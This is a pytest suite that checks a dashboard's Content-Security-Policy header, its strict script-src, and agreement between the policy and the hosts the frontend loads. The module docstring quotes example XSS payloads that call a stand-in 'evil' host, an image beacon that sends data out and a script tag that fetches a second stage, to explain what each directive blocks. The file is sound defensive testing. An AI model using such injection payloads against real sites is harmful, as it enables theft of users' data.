"""The Content-Security-Policy is present, strict where it can be, and cannot
drift away from what the frontend actually loads (L3).

The header block in `api/app.py` used to carry a comment saying a CSP was
deliberately not shipped because the dashboard relies on inline `<script>` and
`<style>` blocks and a strict policy would break the UI. That was true as far as
it went, but it treated "cannot be strict" as "cannot exist" — and gave up
everything a CSP does that has nothing to do with inline script:

    connect-src 'self'   an injected script cannot POST stolen data to an
                         attacker origin. Exfiltration is the entire point of
                         XSS, so this blocks the last step of it.
    img-src 'self' ...   blocks `<img src="//evil/?d=...">` beacons, which need
                         no script execution at all — and were the exact channel
                         this repo's own XSS tests use to prove an injected node
                         went live.
    script-src 'self'    blocks `<script src="//evil/x.js">` even with
                         'unsafe-inline' allowed, so a payload cannot fetch a
                         second stage.
    object-src 'none'    no plugin/embed surface.
    base-uri 'self'      blocks `<base href>` injection, which would silently
                         rewrite every relative URL on the page — including every
                         API call this dashboard makes.
    form-action 'self'   blocks a form being retargeted to an attacker.
    frame-ancestors      clickjacking.

`script-src` carries NO `'unsafe-inline'`, so an injected inline payload cannot
execute at all. That is only true because the last inline script in the frontend
— one IIFE at the end of login.html — was extracted to `frontend/js/login.js`,
and it is verified rather than assumed: breaking that file, or removing its
`<script src>` tag, fails two e2e tests including "login flow — auth enforced",
because the jsdom harness runs with `resources: 'usable'` and really fetches
external scripts over HTTP.

The remaining honest gap is `style-src 'unsafe-inline'`, needed by 43 markup
`style="..."` attributes. CSS cannot execute, and the one exfiltration channel it
does offer (`background:url()` to an attacker origin) is closed by `img-src`, so
this is a much smaller hole than inline script was — and
`test_style_src_still_needs_unsafe_inline_and_says_why` fails the moment those
attributes are gone, prompting the tightening rather than leaving it stale.

Everything else here exists to stop the policy and the frontend drifting apart.
A CSP that blocks a resource the UI needs is not a subtle bug — it is broken
fonts or a missing screenshot, discovered in a browser this sandbox cannot run
(jsdom does not enforce CSP, so the e2e suite cannot catch it either). So the
allowances are re-derived from the frontend by test, not remembered.
"""

import os
import re
import sys
from urllib.parse import urlparse

import pytest
from fastapi.testclient import TestClient

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from api.app import CONTENT_SECURITY_POLICY, _CSP_DIRECTIVES, _csp_header_name, create_app

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
FRONTEND = os.path.join(REPO, "frontend")

# Tags whose src/href makes the browser fetch something, and so is governed by
# a CSP fetch directive. `rel=preconnect` is not a fetch, but its host is
# covered by the same allowance anyway.
RESOURCE_TAG = re.compile(
    r"<(?P<tag>script|link|img|iframe|object|embed|source|video|audio)\b"
    r"[^>]*?\b(?:src|href)\s*=\s*[\"'](?P<url>[^\"']+)[\"']",
    re.IGNORECASE | re.DOTALL,
)

# Hosts a policy source expression permits. Kept explicit rather than parsed out
# of the header, so a test that reads "fonts.googleapis.com is allowed" is
# readable as a statement about the app and not about a regex.
GOOGLE_FONTS = {"fonts.googleapis.com", "fonts.gstatic.com"}


@pytest.fixture()
def client():
    return TestClient(create_app())


def _directive(policy, name):
    """The source list for one directive, as a list of tokens."""
    for part in policy.split(";"):
        tokens = part.strip().split()
        if tokens and tokens[0] == name:
            return tokens[1:]
    return None


# --- the header is actually served -------------------------------------------


@pytest.mark.parametrize(
    "path",
    ["/api/health/live", "/api/jobs", "/login.html", "/index.html", "/css/base.css"],
)
def test_the_policy_is_served_on_every_response(client, path):
    """Including the static assets and the login page, not just the API. A CSP on
    the API alone would protect the JSON and leave the HTML — the thing a browser
    renders — uncovered."""
    response = client.get(path)
    assert response.headers.get("content-security-policy"), (
        f"{path} was served with no Content-Security-Policy "
        f"(status {response.status_code})"
    )


def test_the_served_header_is_the_declared_policy(client):
    response = client.get("/api/health/live")
    assert response.headers["content-security-policy"] == CONTENT_SECURITY_POLICY


def test_every_declared_directive_reaches_the_wire(client):
    """Guards the constant and the header agreeing, so a directive added to
    _CSP_DIRECTIVES cannot silently fail to be sent."""
    sent = client.get("/api/health/live").headers["content-security-policy"]
    for name, value in _CSP_DIRECTIVES:
        assert _directive(sent, name) == value.split(), f"{name} differs on the wire"


# --- the parts that carry the security ---------------------------------------


@pytest.mark.parametrize(
    "name,expected",
    [
        ("default-src", ["'self'"]),
        ("connect-src", ["'self'"]),
        ("form-action", ["'self'"]),
        ("frame-ancestors", ["'self'"]),
        ("object-src", ["'none'"]),
        ("base-uri", ["'self'"]),
    ],
)
def test_the_exfiltration_and_hijacking_directives_are_exact(name, expected):
    """These are the ones that block the damage rather than the payload. Each is
    asserted alone so a loosening shows up as a named failure."""
    assert _directive(CONTENT_SECURITY_POLICY, name) == expected


def test_no_source_is_a_wildcard_or_a_bare_scheme():
    """`*`, `http:` and `https:` all mean "anywhere", which would undo
    connect-src and img-src in one token. `data:` and `blob:` are checked
    separately because they are legitimate but only inside img-src."""
    for part in CONTENT_SECURITY_POLICY.split(";"):
        tokens = part.strip().split()
        if not tokens:
            continue
        name, sources = tokens[0], tokens[1:]
        for source in sources:
            assert source != "*", f"{name} allows *"
            assert source not in ("http:", "https:", "//"), (
                f"{name} allows the bare scheme {source!r}, i.e. any origin"
            )


def test_connect_and_frame_directives_allow_nothing_off_origin():
    for name in ("connect-src", "form-action", "frame-ancestors", "default-src", "script-src"):
        sources = _directive(CONTENT_SECURITY_POLICY, name)
        assert sources is not None, f"{name} is missing entirely"
        for source in sources:
            assert source in ("'self'", "'none'"), (
                f"{name} allows {source!r}; data leaving this origin is the whole "
                "risk this directive exists to close, and none of these five "
                "directives has any reason to allow an inline source"
            )


def test_script_src_allows_no_inline_script():
    """The part of a CSP that actually matters.

    With no 'unsafe-inline' in script-src, an injected inline payload cannot
    execute at all — the policy prevents the injection from starting rather than
    only limiting what a successful one can do. This holds only because the last
    inline script in the frontend was extracted to js/login.js; the test below
    pins that invariant, because adding one back would silently require loosening
    this directive.
    """
    sources = _directive(CONTENT_SECURITY_POLICY, "script-src")
    assert sources == ["'self'"], (
        f"script-src is {sources}. Adding 'unsafe-inline' here means an injected "
        "inline payload runs; adding a nonce or hash means the dashboard can no "
        "longer be served by a StaticFiles mount. Either is a real decision and "
        "should be made in the open, not to get a test passing."
    )


def test_no_html_file_contains_an_inline_script():
    """The invariant that makes script-src 'self' possible.

    A single inline block anywhere in frontend/ would be blocked by the policy,
    so whoever adds one would either loosen script-src for the whole app or ship
    a page with dead JavaScript. Failing here turns that into a conversation.
    """
    offenders = []
    for path in _html_files():
        with open(path, encoding="utf-8") as fh:
            markup = fh.read()
        for match in re.finditer(r"<script(?![^>]*\bsrc=)[^>]*>", markup, re.IGNORECASE):
            offenders.append(f"{os.path.basename(path)}: {match.group(0)[:60]}")
    assert not offenders, (
        "inline <script> blocks that script-src 'self' would block:\n  "
        + "\n  ".join(offenders)
        + "\nMove the code to a file under frontend/js/ and load it with "
        "<script src>, the way login.html now loads js/login.js."
    )


def test_login_html_really_loads_the_extracted_script():
    """The extraction is only real if the page still references the file."""
    with open(os.path.join(FRONTEND, "login.html"), encoding="utf-8") as fh:
        markup = fh.read()
    assert re.search(r'<script[^>]+src="js/login\.js"', markup), (
        "login.html no longer loads js/login.js, so the sign-in form has no "
        "behaviour at all"
    )
    assert os.path.exists(os.path.join(FRONTEND, "js", "login.js")), (
        "js/login.js is referenced but missing"
    )


def test_style_src_still_needs_unsafe_inline_and_says_why():
    """style-src is the one directive that still carries 'unsafe-inline', and it
    cannot drop it while markup style="..." attributes exist — those are governed
    by style-src, not by script-src. 43 of them across index.html, login.html and
    six JS template literals.

    The residual risk is far smaller than inline script: CSS cannot execute, and
    the one exfiltration channel CSS does offer (background:url() to an attacker
    origin) is closed by img-src. If this count reaches zero, tighten the
    directive and update this test.
    """
    assert "'unsafe-inline'" in _directive(CONTENT_SECURITY_POLICY, "style-src")

    count = 0
    for path in _html_files():
        with open(path, encoding="utf-8") as fh:
            count += len(re.findall(r"\bstyle\s*=\s*[\"']", fh.read(), re.IGNORECASE))
    for root, _dirs, files in os.walk(os.path.join(FRONTEND, "js")):
        for name in files:
            if name.endswith(".js"):
                with open(os.path.join(root, name), encoding="utf-8") as fh:
                    count += len(re.findall(r"""style\s*=\s*["'\\]""", fh.read()))
    assert count > 0, (
        "no style= attributes left in the frontend — drop 'unsafe-inline' from "
        "style-src and delete this test's allowance"
    )


def test_no_inline_event_handlers_anywhere():
    """onclick="..." in markup needs 'unsafe-inline' (or 'unsafe-hashes') in
    script-src exactly as an inline <script> does. There are none, which is part
    of why script-src can stay strict; this keeps it that way."""
    pattern = re.compile(
        r"""\bon(?:click|change|input|submit|load|error|mouseover|focus|blur)\s*=\s*["']""",
        re.IGNORECASE,
    )
    offenders = []
    for path in _html_files():
        with open(path, encoding="utf-8") as fh:
            if pattern.search(fh.read()):
                offenders.append(os.path.basename(path))
    for root, _dirs, files in os.walk(os.path.join(FRONTEND, "js")):
        for name in files:
            if name.endswith(".js"):
                with open(os.path.join(root, name), encoding="utf-8") as fh:
                    if pattern.search(fh.read()):
                        offenders.append(os.path.relpath(os.path.join(root, name), REPO))
    assert not offenders, (
        f"inline event handlers in {offenders} would be blocked by script-src "
        "'self'. Attach them with addEventListener instead."
    )


# --- the policy must match what the frontend loads ---------------------------


def _html_files():
    return sorted(
        os.path.join(FRONTEND, name)
        for name in os.listdir(FRONTEND)
        if name.endswith(".html")
    )


def _external_hosts_in_html():
    """Every off-origin host the pages ask the browser to fetch from."""
    hosts = {}
    for path in _html_files():
        with open(path, encoding="utf-8") as fh:
            markup = fh.read()
        for match in RESOURCE_TAG.finditer(markup):
            url = match.group("url")
            if url.startswith("//") or re.match(r"^https?://", url):
                host = urlparse(url).netloc
                if host:
                    hosts.setdefault(host, []).append(
                        f"{os.path.basename(path)} <{match.group('tag')}>"
                    )
    return hosts


def test_the_html_files_were_found():
    """Guards the enumeration tests below from passing vacuously."""
    assert len(_html_files()) >= 2, _html_files()
    assert _external_hosts_in_html(), (
        "no external hosts found in the frontend HTML — either the Google Fonts "
        "links were removed (in which case tighten style-src and font-src) or "
        "the regex stopped matching"
    )


def test_every_off_origin_host_the_pages_load_is_allowed():
    """The drift test. A new CDN, analytics tag, font provider or widget added to
    the HTML would be blocked by this policy — silently, in a real browser, with
    nothing in the test suite noticing. So the enumeration is the assertion."""
    policy = CONTENT_SECURITY_POLICY
    allowed = set()
    for _name, value in _CSP_DIRECTIVES:
        for token in value.split():
            if token.startswith("https://") or token.startswith("http://"):
                allowed.add(urlparse(token).netloc)

    blocked = {
        host: where
        for host, where in _external_hosts_in_html().items()
        if host not in allowed
    }
    assert not blocked, (
        "the frontend loads from origins the policy does not allow, so these will "
        f"be blocked in a real browser: {blocked}. Either add the host to the "
        "matching directive in api/app.py with a comment saying what it is for, "
        "or self-host the resource and drop the allowance."
    )


def test_google_fonts_is_allowed_where_it_is_needed():
    hosts = _external_hosts_in_html()
    assert set(hosts) == GOOGLE_FONTS, (
        f"expected exactly the two Google Fonts hosts, found {sorted(hosts)} — "
        "update this test deliberately, not by pasting the new list in"
    )
    # The stylesheet comes from googleapis, the font files themselves from
    # gstatic. Allowing only one produces a page that fetches CSS and then cannot
    # load the faces it names.
    assert "https://fonts.googleapis.com" in _directive(CONTENT_SECURITY_POLICY, "style-src")
    assert "https://fonts.gstatic.com" in _directive(CONTENT_SECURITY_POLICY, "font-src")


def test_blob_images_are_allowed_because_the_screenshot_needs_them():
    """autoApply.js renders the review screenshot through URL.createObjectURL
    when the session cookie will not ride along on a cross-origin <img>. A policy
    without `blob:` in img-src breaks that fallback and shows a missing image
    instead of the before-submit screenshot."""
    with open(os.path.join(FRONTEND, "js", "components", "autoApply.js"), encoding="utf-8") as fh:
        source = fh.read()
    uses_blob = "createObjectURL" in source and re.search(r"img\.src\s*=\s*objectUrl", source)
    if uses_blob:
        assert "blob:" in _directive(CONTENT_SECURITY_POLICY, "img-src"), (
            "autoApply.js sets an <img> src to a blob: URL, which img-src must allow"
        )


def test_the_api_is_same_origin_so_connect_src_self_is_enough():
    """connect-src 'self' is only safe because the UI and the API share an
    origin. Two things make that true and both are checked: Caddy proxies
    everything to the api service, and api.js resolves its base URL to
    window.location.origin rather than to a hardcoded host."""
    with open(os.path.join(FRONTEND, "js", "api.js"), encoding="utf-8") as fh:
        source = fh.read()
    assert "window.location.origin" in source, (
        "api.js no longer derives its base URL from the page origin, so "
        "connect-src 'self' may now block the dashboard's own API calls"
    )

    with open(os.path.join(REPO, "deploy", "Caddyfile"), encoding="utf-8") as fh:
        caddyfile = fh.read()
    assert "reverse_proxy api:8000" in caddyfile, (
        "Caddy no longer proxies the API on the same origin as the UI"
    )


def test_no_absolute_url_in_frontend_js_reaches_a_blocked_origin():
    """The JS equivalent of the HTML enumeration. The only absolute URLs allowed
    are the loopback dev fallback (used when the page is opened over file://,
    which no server delivers and which therefore carries no CSP) and hosts the
    policy already allows."""
    allowed = {urlparse(value).netloc for _n, value in _CSP_DIRECTIVES if "://" in value}
    offenders = []
    for root, _dirs, files in os.walk(os.path.join(FRONTEND, "js")):
        for name in files:
            if not name.endswith(".js"):
                continue
            path = os.path.join(root, name)
            with open(path, encoding="utf-8") as fh:
                source = fh.read()
            for match in re.finditer(r"https?://([^/\"'\s)]*)", source):
                host = match.group(1).split(":")[0]
                if not host:
                    continue  # 'https://' + userInput — a normaliser, not a load
                if host in ("127.0.0.1", "localhost"):
                    continue  # file:// dev fallback, never served with a CSP
                if host not in allowed:
                    offenders.append(f"{os.path.relpath(path, REPO)} -> {host}")
    assert not offenders, (
        "frontend JS references origins the policy blocks:\n  " + "\n  ".join(offenders)
    )


# --- the mode switch ---------------------------------------------------------


def test_report_only_mode_sends_the_report_only_header(monkeypatch, client):
    """The correct way to check a policy against a real browser before enforcing
    it, and the escape hatch if a policy verified here still breaks something in
    a browser this sandbox cannot run."""
    monkeypatch.setenv("CSP_MODE", "report-only")
    response = client.get("/api/health/live")
    assert response.headers.get("content-security-policy-report-only") == CONTENT_SECURITY_POLICY
    assert "content-security-policy" not in response.headers, (
        "report-only mode must not also enforce"
    )


@pytest.mark.parametrize("mode", ["off", "disabled", "none"])
def test_off_sends_neither_header(monkeypatch, client, mode):
    monkeypatch.setenv("CSP_MODE", mode)
    response = client.get("/api/health/live")
    assert "content-security-policy" not in response.headers
    assert "content-security-policy-report-only" not in response.headers


def test_the_default_is_to_enforce(monkeypatch):
    monkeypatch.delenv("CSP_MODE", raising=False)
    assert _csp_header_name() == "Content-Security-Policy"


def test_an_unrecognised_mode_enforces_rather_than_failing_open(monkeypatch):
    """A typo must not silently remove the protection. Failing loud and closed is
    the same rule the CORS filter in api/deps.py follows."""
    monkeypatch.setenv("CSP_MODE", "stric")
    with pytest.warns(RuntimeWarning):
        assert _csp_header_name() == "Content-Security-Policy"


# --- the headers that were already there -------------------------------------


def test_the_pre_existing_headers_survive(client):
    """Adding a CSP must not have displaced the three headers that were already
    correct, one of which (X-Frame-Options) is still needed for browsers that do
    not implement frame-ancestors."""
    headers = client.get("/api/health/live").headers
    assert headers["x-content-type-options"] == "nosniff"
    assert headers["x-frame-options"] == "SAMEORIGIN"
    assert headers["referrer-policy"] == "strict-origin-when-cross-origin"
